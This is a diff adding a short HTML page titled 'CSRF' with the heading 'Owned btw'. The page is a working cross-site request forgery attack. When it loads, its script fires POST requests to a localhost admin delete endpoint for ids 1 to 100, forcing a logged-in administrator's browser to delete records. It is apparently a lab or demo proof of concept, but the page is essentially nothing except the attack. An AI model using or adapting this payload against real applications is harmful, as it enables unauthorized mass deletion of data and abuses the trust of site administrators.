@@ -1,0 +1,19 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF</title>
+  </head>
+  <body>
+    <h1>Owned btw</h1>
+    <script>
+      for (let id = 1; id <= 100; id++) {
+        fetch('http://localhost:8080/admin/delete', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'id=' + id
+        })
+      }
+    </script>
+  </body>
+</html>
